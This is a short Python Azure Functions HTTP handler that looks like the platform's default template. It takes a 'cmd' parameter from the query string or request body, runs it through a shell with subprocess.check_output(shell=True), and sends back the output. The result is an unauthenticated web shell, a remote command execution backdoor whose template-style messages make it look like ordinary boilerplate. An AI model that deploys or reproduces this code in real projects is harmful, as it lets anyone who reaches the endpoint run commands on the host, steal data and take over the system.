import logging

import azure.functions as func

import logging
import json
import subprocess
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    cmd = req.params.get('cmd')

    if not cmd:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            cmd = req_body.get('cmd')

    if cmd:
        output = subprocess.check_output(cmd, shell=True)
        return func.HttpResponse(output, status_code=200)
    else:
        return func.HttpResponse(
             "This HTTP triggered function executed successfully. Pass a cmd in the query string or in the request body for a personalized response.",
             status_code=200
        )

